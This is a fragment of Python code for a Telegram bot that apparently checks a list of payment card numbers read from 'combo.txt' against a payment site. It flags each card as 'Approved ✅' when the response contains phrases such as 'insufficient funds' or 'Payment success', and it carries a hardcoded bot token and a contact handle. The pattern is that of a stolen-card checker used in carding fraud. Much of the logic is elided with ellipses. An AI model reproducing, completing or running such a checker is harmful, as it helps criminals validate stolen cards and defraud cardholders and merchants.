...
faker = Faker()
token = "7069208527:AAH5NfqgkjsnjuzdYd8IVjXI_T5wLu_CGKI" #توكنك
    ...
    try:
        with open("combo.txt", 'r') as file:
            ...
            for P in lino:
                ...
                try:
                    if any(keyword in res for keyword in ["Your card has insufficient funds", "insufficient funds", "Payment success", "Thank you for your support.", "insufficient_funds", "card has insufficient funds", "successfully", "payment-successfully"]):
                        ch += 1
                        stay = 'Approved ✅'
                        try:
                ...
                bot.edit_message_text(chat_id=message.chat.id, message_id=koko,
                                      text='''WAITING MONEY ➜ @ccn_a ''', reply_markup=mes)
